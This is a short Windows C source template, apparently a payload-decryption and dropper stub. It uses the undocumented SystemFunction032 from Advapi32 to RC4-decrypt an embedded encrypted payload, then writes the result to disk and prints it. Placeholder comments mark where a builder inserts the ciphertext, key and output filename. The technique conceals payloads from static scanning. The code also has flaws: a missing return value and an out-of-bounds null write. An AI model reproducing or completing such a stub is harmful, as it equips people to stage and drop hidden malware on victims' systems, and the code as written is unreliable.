#include <Windows.h>
#include <stdio.h>

// [[CIPHERTEXT]]

// [[KEY]]

// [[FILENAME]]

typedef struct USTRING
{
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Data,
    struct USTRING* Key
    );

BOOL RC4Deseal(IN PBYTE pKey, IN PBYTE pPayload, IN DWORD dwKeySize, IN DWORD dwPayloadSize) {

    NTSTATUS STATUS = 0;

    USTRING Data = {
        .Length = dwPayloadSize,
        .MaximumLength = dwPayloadSize,
        .Buffer = pPayload
    };

    USTRING Key = {
        .Length = dwKeySize,
        .MaximumLength = dwKeySize,
        .Buffer = pKey
    };

    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    if ((STATUS = SystemFunction032(&Data, &Key)) != 0x0) {
        printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
        return FALSE;
    }

    ciphertext[dwPayloadSize] = '\0';

    return TRUE;
}

DWORD WritePayload() {
	HANDLE hFile = CreateFileW(lpFilename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		return -1;
	}

	DWORD bytesWritten;
	if (!WriteFile(hFile, ciphertext, sizeof(ciphertext), &bytesWritten, NULL)) {
		CloseHandle(hFile);
		return -1;
	}
	CloseHandle(hFile);
	return 0;
}

DWORD PrintPayload() {
	printf("payload : \"%s\" \n", ciphertext);
}

int main() {
	if (!RC4Deseal(key, ciphertext, sizeof(key), sizeof(ciphertext))) {
		return -1;
	}

	WritePayload();
	PrintPayload();
    return 0;
}